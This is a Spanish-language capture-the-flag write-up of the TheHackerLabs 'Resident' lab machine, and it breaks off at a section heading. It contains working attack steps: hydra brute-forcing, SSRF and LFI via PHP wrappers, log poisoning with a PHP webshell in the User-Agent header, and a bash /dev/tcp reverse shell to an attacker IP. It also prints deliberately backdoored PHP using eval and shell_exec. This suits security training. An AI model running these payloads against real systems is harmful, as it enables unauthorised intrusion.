---
title: "Resident - TheHackerLabs"
date: 2025-09-17
draft: false
slug: "THL-writeup-resident"
excerpt: "Esta fue una máquina complicada. Después de analizar los escaneos, vamos a la página web activa en el puerto 80 que resulta ser un login. Al no encontrar una forma de vulnerar el login, aplicamos Fuzzing Web, descubriendo así el archivo robots.txt que contiene un usuario y una contraseña codificada en base64. La decodificamos y ganamos acceso al login. Dentro del login, analizamos el dashboard siendo que nos permite aplicar Server-Side Request Forgery (SSRF), Local File Inclusion (LFI) y Log Poisoning. Usamos el Log Poisoning para inyectar el código de una WebShell de PHP que nos permite ganar acceso principal a la máquina víctima. En la máquina, encontramos las credenciales de acceso para el servicio MariaDB. Dichas contraseñas nos sirven para autenticarnos con otro usuario de la máquina. Como este nuevo usuario, encontramos un script en su directorio, que realiza una copia de un Hash que es la contraseña de otro usuario, que está codificada en Yescrypt. Usamos JohnTheRipper para crackear ese Hash y nos autenticamos como este otro usuario. Ya como el nuevo usuario, encontramos la contraseña en texto plano del Root en el directorio de este nuevo usuario, logrando escalar privilegios de manera muy sencilla."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "SSH", "MariaDB", "Web Enumeration", "Fuzzing", "Information Leakage", "Base64 Decodification", "BurpSuite", "Server-Side Request Forgery (SSRF)", "Server-Side Request Forgery (SSRF) + Local File Inclusion (LFI)", "SSRF + LFI + PHP Wrapper", "Log Poisoning", "Abusing Hidden Web Functionality", "Brute Force Attack", "MariaDB Enumeration", "Password Reuse", "Cracking Hash", "Cracking Yescrypt Hash", "Credential Exposure", "Privesc - Credential Exposure", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "Wappalizer"
  - "wfuzz"
  - "gobuster"
  - "echo"
  - "base64"
  - "CyberChef"
  - "BurpSuite"
  - "wc"
  - "crunch"
  - "hydra"
  - "python3"
  - "seq"
  - "ffuf"
  - "nc"
  - "bash"
  - "ssh"
  - "grep"
  - "ss"
  - "mysql"
  - "cat"
  - "su"
  - "chmod"
  - "Hash.com"
  - "JohnTheRipper"
links:
  - "https://gchq.github.io/CyberChef/"
  - "https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html#protocols"
  - "https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#lfi--rfi-using-php-wrappers--protocols"
  - "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.html"
  - "https://curiosidadesdehackers.com/explotacion-de-la-vulnerabilidad-log-poisoning-mediante-lfi-rfi-y-rce-explicaciones-y-poc/"
  - "https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/logs-poisoning"
  - "https://medium.com/@brsdncr/case-path-truncation-lfi-8a3a748c0382"
  - "https://hashes.com/en/tools/hash_identifier"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-resident/resident.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina:
```bash
ping -c 4 192.168.100.110
PING 192.168.100.110 (192.168.100.110) 56(84) bytes of data.
64 bytes from 192.168.100.110: icmp_seq=1 ttl=64 time=2.00 ms
64 bytes from 192.168.100.110: icmp_seq=2 ttl=64 time=0.656 ms
64 bytes from 192.168.100.110: icmp_seq=3 ttl=64 time=0.946 ms
64 bytes from 192.168.100.110: icmp_seq=4 ttl=64 time=1.04 ms

--- 192.168.100.110 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3009ms
rtt min/avg/max/mdev = 0.656/1.160/2.001/0.505 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.110 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-16 12:49 CST
Initiating ARP Ping Scan at 12:49
Scanning 192.168.100.110 [1 port]
Completed ARP Ping Scan at 12:49, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:49
Scanning 192.168.100.110 [65535 ports]
Discovered open port 22/tcp on 192.168.100.110
Discovered open port 80/tcp on 192.168.100.110
Completed SYN Stealth Scan at 12:49, 10.98s elapsed (65535 total ports)
Nmap scan report for 192.168.100.110
Host is up, received arp-response (0.00077s latency).
Scanned at 2025-09-16 12:49:19 CST for 11s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.18 seconds
           Raw packets sent: 80877 (3.559MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solo veo 2 puertos abiertos. Supongo que la intrusión será por el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.100.110 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-16 12:49 CST
Nmap scan report for 192.168.100.110
Host is up (0.00082s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)

| ssh-hostkey: 
|   256 e8:fc:cb:53:f8:97:01:69:27:3c:58:0c:48:b7:28:eb (ECDSA)
|_  256 fa:87:ab:ce:92:42:86:71:55:00:b1:35:96:93:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))

| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Iniciar Sesi\xC3\xB3n
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.27 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Observa lo que obtuvo el escaneo de la página web activa en el **puerto 80**.

Tenemos una cookie y el título de la página hace mención a un login.

Analicemos esa página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura1.png">
</p>

Parece ser un simple login.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura2.png">
</p>

Nos menciona que el login está hecho con **PHP**, algo bastante útil, pues pueden existir más scripts hechos en **PHP**.

Si revisamos el código fuente, no encontraremos algo de utilidad.

Podríamos intentar aplicar **Inyecciones SQL**, pero no parecen funcionar en este caso.

Apliquemos **Fuzzing** para ver si existe algún otro script de PHP o directorio oculto.

### Fuzzing {#fuzz}

Esta vez, utilizaremos **wfuzz** porque la herramienta **ffuf** no obtuvo ningún resultado: 
```bash
wfuzz -c --hc=404 -t 300 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-txt-html  http://192.168.100.110/FUZZ.FUZ2Z
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.100.110/FUZZ.FUZ2Z
Total requests: 661635

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000001:   200        74 L     179 W      2280 Ch     "index - php"                                                                                                                
000003631:   302        0 L      0 W        0 Ch        "logout - php"                                                                                                               
000000211:   200        934 L    4733 W     79748 Ch    "info - php"                                                                                                                 
000008737:   302        0 L      0 W        0 Ch        "dashboard - php"                                                                                                            
000005252:   200        3 L      4 W        144 Ch      "robots - txt"                                                                                                               
000004756:   200        1 L      0 W        1 Ch        "connect - php"                                                                                                              
000135678:   403        9 L      28 W       280 Ch      "html"                                                                                                                       
000135676:   403        9 L      28 W       280 Ch      "php"                                                                                                                        

Total time: 814.0375
Processed Requests: 661635
Filtered Requests: 661627
Requests/sec.: 812.7819
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-z*       | Para indicar una busqueda de archivos específicos. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.100.110/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 -x .php,.txt,.html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.110/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/info.php             (Status: 200) [Size: 79489]
/index.php            (Status: 200) [Size: 2284]
/javascript           (Status: 301) [Size: 323] [--> http://192.168.100.110/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/connect.php          (Status: 200) [Size: 1]
/robots.txt           (Status: 200) [Size: 144]
/dashboard.php        (Status: 302) [Size: 0] [--> index.php]
/server-status        (Status: 403) [Size: 280]
Progress: 882176 / 882176 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*       | Para indicar una busqueda de archivos específicos. |

Obtuvimos varios resultados, de los que solamente podremos ver **info.php** y **robots.txt**.

Pero si leemos el archivo **robots.txt**, veremos algo interesante:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura3.png">
</p>

Parece que encontramos un usuario y contraseña para el login, pero la contraseña es un poco extraña.

Vamos a analizarla.

## Explotación de Vulnerabilidades {#Explotacion}

### Identificación y Decodificación de Contraseña en Base64 {#base64}

Viéndolo de manera rápida, parece que es un Hash extraño, pero no lo es.

Observa que se pueden ver los caracteres **z** y **9**, lo que nos puede dar un indicio de que está codificado en **base64**.

Decodifiquémoslo:
```bash
echo -n 'JTM1JTYxJTMwJTM2JTMxJTM1JTMzJTYyJTMxJTMyJTYyJTMyJTY1JTYzJTM2JTMyJTMxJTMwJTYxJTM4JTYyJTYyJTM2JTM2JTY2JTM0JTY1JTM3JTM4JTYzJTM0' | base64 -d
%35%61%30%36%31%35%33%62%31%32%62%32%65%63%36%32%31%30%61%38%62%62%36%36%66%34%65%37%38%63%34
```
Esto nos puede despistar.

Pero resulta ser código **URL encodeado**, que podemos decodificarlo con **CyberChef** o **BurpSuite**.

Primero, hagamoslo con **CyberChef**:
* <a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a>

Pasemos el Hash en **base64**, lo decodificamos y la respuesta, la decodificamos en **URL decode**:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura4.png">
</p>

Obtuvimos lo que parece ser un **Hash MD5**.

Ahora veamos cómo obtener el mismo Hash con **BurpSuite** usando el **Decoder**.

Tan solo debemos escoger en el botón `Decode as...` **Base64** y luego **URL**:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura5.png">
</p>

Listo, obtenemos el mismo Hash.

Pero, si analizamos la cantidad de caracteres de ese Hash, resulta que le falta 1 caracter para cumplir con el tamaño en regla de una **Hash MD5**:
```bash
echo -n '5a06153b12b2ec6210a8bb66f4e78c4' | wc -c
31
```
Para averiguar qué carácter nos falta, podemos crear un wordlist que contenga de la letra `a-f` y del número `0-9`.

Lo podemos crear con **crunch**:
```bash
crunch 32 32 abcdefABCDEF0123456789 -t 5a06153b12b2ec6210a8bb66f4e78c4@ -o MD5wordlist.txt
Crunch will now generate the following amount of data: 726 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 22 

crunch: 100% completed generating output
```
Suponiendo que el **Hash MD5** es la contraseña, podemos aplicar fuerza bruta al login con **hydra** para identificar que Hash es el correcto.

Lo usaremos para que ataque un formulario por **petición POST** y en el código fuente del login, veremos los parámetros que se envían:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura6.png">
</p>

Y podemos usar el mensaje de error del login como un filtro:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura7.png">
</p>

Probémoslo:
```bash
hydra -l 'admin' -P ./MD5wordlist.txt 192.168.100.110 http-form-post '/index.php:username=^USER^&password=^PASS^:F=Usuario o contraseña incorrectos'
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-16 15:18:43
[DATA] max 16 tasks per 1 server, overall 16 tasks, 22 login tries (l:1/p:22), ~2 tries per task
[DATA] attacking http-post-form://192.168.100.110:80/index.php:username=^USER^&password=^PASS^:F=Usuario o contraseña incorrectos
[80][http-post-form] host: 192.168.100.110   login: admin   password: 5a06153b12b2ec6210a8bb66f4e78c4*
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-16 15:18:44
```
Lo tenemos.

Y si lo probamos en el login, ganaremos acceso:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura8.png">
</p>

### Identificando Cross-Site Scripting (XSS) y Server-Side Request Forgery (SSRF) {#XSS}

En el dashboard tenemos dos campos donde podemos enviar texto y solicitar una URL.

Analizando el funcionamiento del campo de envío de texto, vemos que es posible aplicar **XSS**:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura9.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura10.png">
</p>

Pero esto no nos ayuda de momento.

Para probar el campo de la URL, vamos a crear un archivo random de texto y luego levantaremos un servidor web con **Python3**:
```bash
echo -n "Esto es un test" > test.txt

python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Usemos la URL de nuestro servidor para probar este campo:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura11.png">
</p>

Funciona y observa que en la URL aparece el parámetro `url=`.

Quizá la página web sea vulnerable a **Remote File Inclusion (RFI)**, pero la página no ejecuta el código de la página que visita, solo lo muestra como si hiciera un **curl**, por lo que descartamos esta vulnerabilidad.

Entonces, podemos hacer varias pruebas con este parámetro:
* Probar **Server-Side Request Forgery (SSRF)**.
* Probar **Local File Inclusion (LFI) + PHP Wrapper**.

Enfoquémonos en el **SSRF**.

### Aplicando Server-Side Request Forgery (SSRF) en Parámetro Vulnerable del Dashboard {#SSRF}

Primero que nada, ¿Qué es **Server-Side Request Forgery (SSRF)**?

| **Server-Side Request Forgery (SSRF)** |
|:-----------------:|
| *Es una vulnerabilidad de seguridad en aplicaciones web donde un atacante consigue que el servidor vulnerable haga solicitudes HTTP (o de otro protocolo) a un recurso arbitrario, en lugar de que sea el cliente quien las haga. En un SSRF, el atacante manipula la entrada (como una URL) para que el servidor realice la solicitud hacia donde el atacante quiera. Esto puede permitir escanear puertos internos, acceder a servicios internos, leer archivos locales, exfiltrar datos y/o ejecutar código remoto (RCE).* |

Una forma de comprobar si existe la vulnerabilidad **SSRF**, es tratando de apuntar a un archivo del servidor web activo en la máquina víctima, por ejemplo:
```bash
url=http://127.0.0.1/index.php
```

Observa el resultado:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura12.png">
</p>

Funcionó, ósea que es posible que podamos ver más archivos locales.

Otra forma sería apuntar a una página web random, pero eso ya lo hicimos antes, por lo que terminamos de comprobar que la página es vulnerable a **SSRF**.

Aprovechando esta vulnerabilidad, podemos identificar qué puertos internos están abiertos, pero ten cuidado, pues puede que existan más puertos abiertos a los que es más complicado identificar.

De momento, vamos a escanear 10 mil puertos. Puedes crear un wordlist que tenga del número 1 al 10 mil con el comando **seq**:
```bash
seq 1 10000 > ports.txt
```

Y podemos usar **wfuzzz** o **ffuf** para realizar el **Fuzzing** de puertos:
```bash
ffuf -w ./ports.txt:FUZZ -u http://192.168.100.110/dashboard.php?url=http://127.0.0.1:FUZZ/ -b 'PHPSESSID=Tu_Cookie' -fr 'No se pudo acceder a la URL.'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.110/dashboard.php?url=http://127.0.0.1:FUZZ
 :: Wordlist         : FUZZ: /../TheHackersLabs/Resident/content/ports.txt
 :: Header           : Cookie: PHPSESSID=Tu_Cookie
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: No se pudo acceder a la URL.
________________________________________________

80                      [Status: 200, Size: 8104, Words: 2664, Lines: 237, Duration: 5ms]
631                     [Status: 200, Size: 9121, Words: 2152, Lines: 215, Duration: 17ms]
:: Progress: [10000/10000] :: Job [1/1] :: 399 req/sec :: Duration: [0:00:22] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-b*       | Para cargar una cookie al ataque. |
| *-fr*      | Para aplicar un filtro de expresiones regulares. |

Logramos identificar el puerto interno 631, que pertenece al **servicio CUPS**.

Continuemos.

### Aplicando Server-Side Request Forgery (SSRF) + Local File Inclusion (LFI) {#SSRFyLFI}

Recordando que la página web está hecha con **PHP**, es posible que funcione un **PHP Wrapper**, lo que nos permitiría aplicar **Local File Inclusion (LFI)**.

Tomemos en cuenta algunas cosillas:
* La opción de **PHP Wrapper** a utilizar es `file://`, ya que este permite la inclusión de archivos locales.
* Necesitamos usar la cookie de nuestra sesión para que funcione el ataque, que la puedes obtener de la sección **Storage** del **Inspector** web.
* Usaremos la herramienta **wfuzz**, pues es la mejor opción (al menos a mi parecer) para esta clase de pruebas.
* Por último, usaremos el wordlist **LFI-Jhaddix.txt** de **SecLists**.

Probémoslo:
```bash
wfuzz -c --hc=404 -t 300 --hl=162,163 -b 'PHPSESSID=Tu_Cookie' -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://192.168.100.110/dashboard.php?url=file://FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.100.110/dashboard.php?url=file://FUZZ
Total requests: 929

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000254:   200        200 L    519 W      7562 Ch     "/../../../../../../../../../../etc/passwd"                                                                                  
000000257:   200        200 L    519 W      7532 Ch     "/etc/passwd"                                                                                                                
000000253:   200        200 L    519 W      7554 Ch     "/./././././././././././etc/passwd"                                                                                          
000000250:   200        182 L    530 W      6040 Ch     "/etc/nsswitch.conf"                                                                                                         
000000249:   200        181 L    565 W      6263 Ch     "/etc/netconfig"                                                                                                             
000000246:   200        169 L    503 W      5723 Ch     "/etc/motd"                                                                                                                  
000000248:   200        191 L    636 W      6621 Ch     "/etc/mysql/my.cnf"                                                                                                          
000000236:   200        515 L    1504 W     14725 Ch    "/etc/init.d/apache2"                                                                                                        
000000209:   200        179 L    573 W      6174 Ch     "/etc/hosts.deny"                                                                                                            
000000208:   200        172 L    519 W      5870 Ch     "/etc/hosts.allow"                                                                                                           
000000205:   200        170 L    488 W      5646 Ch     "/etc/hosts"                                                                                                                 
000000237:   200        174 L    498 W      5871 Ch     "/etc/issue"                                                                                                                 
000000138:   200        229 L    529 W      6409 Ch     "/etc/group"                                                                                                                 
000000135:   200        177 L    571 W      6300 Ch     "/etc/fstab"                                                                                                                 
000000129:   200        180 L    568 W      6513 Ch     "/etc/apt/sources.list"                                                                                                      
000000131:   200        184 L    652 W      6524 Ch     "/etc/crontab"                                                                                                               
000000121:   200        387 L    1569 W     12916 Ch    "/etc/apache2/apache2.conf"                                                                                                  
000000498:   200        192 L    631 W      7052 Ch     "/proc/interrupts"                                                                                                           
000000509:   200        219 L    601 W      6823 Ch     "/proc/self/status"                                                                                                          
000000505:   200        166 L    526 W      6044 Ch     "/proc/net/tcp"                                                                                                              
000000506:   200        168 L    482 W      5591 Ch     "/proc/partitions"                                                                                                           
000000504:   200        165 L    495 W      5827 Ch     "/proc/net/route"                                                                                                            
000000500:   200        215 L    617 W      6916 Ch     "/proc/meminfo"                                                                                                              
000000502:   200        165 L    483 W      5680 Ch     "/proc/net/arp"                                                                                                              
000000497:   200        216 L    800 W      7449 Ch     "/proc/cpuinfo"                                                                                                              
000000501:   200        186 L    606 W      7218 Ch     "/proc/mounts"                                                                                                               
000000503:   200        166 L    516 W      5893 Ch     "/proc/net/dev"                                                                                                              
000000652:   500        0 L      0 W        0 Ch        "/var/log/apache2/error.log"                                                                                                 
000000648:   500        0 L      0 W        0 Ch        "/var/log/apache2/access.log"                                                                                                
000000758:   200        194 L    542 W      6389 Ch     "/var/www/html/.htaccess"                                                                                                    
000000741:   200        165 L    505 W      45765 Ch    "/var/log/wtmp"                                                                                                              
000000929:   200        200 L    519 W      7547 Ch     "///////../../../etc/passwd"                                                                                                 
000000016:   200        200 L    519 W      7562 Ch     "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"                                          
000000422:   200        284 L    850 W      8701 Ch     "/etc/ssh/sshd_config"                                                                                                       
000000400:   200        203 L    582 W      6347 Ch     "/etc/rpc"                                                                                                                   
000000399:   200        165 L    470 W      5526 Ch     "/etc/resolv.conf"                                                                                                           

Total time: 15.95447
Processed Requests: 929
Filtered Requests: 893
Requests/sec.: 58.22818
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *--hl*     | Para no mostrar una n cantidad de lineas en los resultados. |
| *-b*       | Para cargar una cookie al ataque. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Puedes obtener resultados variados si modificas el **PHP Wrapper** como `file:` o `file:/`.

Probemos uno de los resultados:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura13.png">
</p>

Vemos qué existe el **usuario ram**, quizá le podamos aplicar fuerza bruta, pero dejémoslo para más adelante.

Algo importante que podemos ver, es que se pudo identificar el archivo **error.log** y **access.log**, lo que nos podría indicar que la página es vulnerable a **Log Poisoning**.

Aunque ahí mismo nos dice que no hay contenido por ver, por lo que una opción bastante viable, es buscar la forma de poder ver estos dos archivos.

#### Obteniendo y Analizando Código Fuente de dashboard.php con SSRF + LFI + PHP Wrapper {#Dashboard}

Otra cosa que podemos hacer, ya que funcionó el uso de **PHP Wrappers**, es tratar de obtener el código de la página actual, ósea, el código fuente completo de la página **dashboard.php**.

Esto lo podemos hacer con el **PHP Wrapper** `php://filter/convert.base64-encode/resource=` para obtener todo el código en **base64**:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura14.png">
</p>

Lo tenemos, ya solo falta decodificarlo:
```bash
echo -n 'base64_copiada' | base64 -d
...
<?php
session_start();

// Verificar si el usuario ha iniciado sesión
if (!isset($_SESSION['username'])) {
    header("Location: index.php");
    exit();
}

// Inicializar variables
$message = "";
$response = "";

// Evaluar el User-Agent y ejecutar código PHP
if (isset($_SERVER['HTTP_USER_AGENT'])) {
    // Se obtiene el User-Agent
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    // Ejecutar el código PHP contenido en el User-Agent
    if (preg_match('/<\?php(.*)\?>/s', $user_agent, $matches)) {
        // Extraer el código y evaluarlo
        eval($matches[1]);
    }
}

// Procesar la URL proporcionada en la consulta
if (isset($_GET['url'])) {
    // Obtener la URL de la consulta
    $url = $_GET['url'];

    // Validar y procesar la solicitud SSRF si se proporciona una URL
    if (filter_var($url, FILTER_VALIDATE_URL)) {
        // Realizar la solicitud a la URL ingresada
        // Esto es vulnerable a SSRF
        $response = @file_get_contents($url); // Usar @ para suprimir errores
        if ($response === FALSE) {
            $response = "No se pudo acceder a la URL.";
        } else {
            // Si la solicitud fue exitosa, mostrar el contenido recibido
            $response = htmlspecialchars($response);
        }
    } else {
        $response = "URL no válida.";
    }
}

// Procesar el mensaje enviado desde el formulario
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['user_message'])) {
    // Obtener el mensaje del formulario
    $message = $_POST['user_message'];

    // Aquí se ejecuta el comando si se detecta la palabra clave "cmd:"
    if (strpos($message, 'cmd:') === 0) {
        $command = substr($message, 4); // Obtener el comando después de "cmd:"
        // Ejecutar el comando y almacenar la salida
        $output = shell_exec($command);
        $message = htmlspecialchars($output); // Muestra la salida en el mensaje
    }
}
?>
...
```
Observa todo el código que obtuvimos y lo que nos interesa es el script de **PHP**.

Ahí mismo vemos qué vulnerabilidades podemos explotar:
* Nos indica que se evalúa la cabecera **User-Agent** para ejecutar código **PHP** con la función `eval()`.
* Se evalúa la URL para validar y procesar las solicitudes que aplican el **SSRF**, esto gracias a la función `@file_get_contents()`.
* Curiosamente, parece que el campo del mensaje a enviar nos permite la ejecución de comandos si le damos la palabra clave **cmd**. Usaremos esta vulnerabilidad más adelante.

De igual forma, ya que pudimos obtener un archivo completo, es posible que podamos obtener el archivo **access.log** apuntando a su ruta para convertirlo en **base64**:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura15.png">
</p>

Repetimos el proceso de decodificarlo, pero con esto ya comprobamos que la página es vulnerable a **Log Poisoning**.

Vamos a aplicarlo.

### Aplicando Log Poisoning para Explotar Remote Code Execution (RCE) y Obtener Reverse Shell {#Poisoning}

¿Qué es **Log Poisoning**?

| **Log Poisoning** |
|:-----------------:|
| *Log poisoning (envenenamiento de logs) es una técnica por la que un atacante introduce datos maliciosos o manipulados dentro de los ficheros de registro (logs) de una aplicación, servidor o sistema con algún objetivo: ocultar actividad, alterar auditorías, disparar vulnerabilidades en el proceso que consume o analiza esos logs, o engañar a equipos/alertas de seguridad.* |

El mismísimo master **CuriosidadesDeHackers** tiene una PoC en su blog:
* <a href="https://curiosidadesdehackers.com/explotacion-de-la-vulnerabilidad-log-poisoning-mediante-lfi-rfi-y-rce-explicaciones-y-poc/" target="_blank">CuriosidadesDeHackers: Explotación de la vulnerabilidad Log Poisoning mediante LFI, RFI y RCE, explicaciones y PoC</a>

Igual, aquí hay otro ejemplo sobre cómo aplicar **Log Poisoning**:
* <a href="https://medium.com/@brsdncr/case-path-truncation-lfi-8a3a748c0382" target="_blank">Case: Path Truncation-LFI</a>

Puedes aplicar el **Log Poisoning** desde **BurpSuite**.

Captura la petición de la **base64** del archivo **access.log** y mandala al **Repeater**:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura16.png">
</p>

Vamos a tratar de inyectar una **WebShell** con el siguiente código:
```bash
<?php system($_GET['cmd']);?>
```

Lo inyectamos en la cabecera del **User-Agent** y mandamos la petición:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura17.png">
</p>

Observa que obtuvimos un error, pero esto debería infectar el servidor con nuestro código.

Entonces, manteniendo el código en la cabecera **User-Agent** y agregando el parámetro `&cmd=comando` al parámetro `url=`, se debería ejecutar el comando que queramos:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura18.png">
</p>

Ahí está, ya podemos ejecutar cualquier comando.

Mandémonos una **Reverse Shell**.

Abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Usemos la siguiente **Reverse Shell**:
```bash
bash -c 'bash >& /dev/tcp/Tu_IP/443 0>&1'
```

**URL encodea** el comando y luego, manda la petición:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura19.png">
</p>

Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.100.110] 42458

whoami
www-data
```

Obtengamos una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
www-data@TheHackersLabs-Resident:/var/www/html$ whoami
www-data
```
Continuemos.

### Abusando de Funcionalidad Oculta en Campo de Envío de Texto del Dashboard para Obtener una Reverse Shell {#cmd}

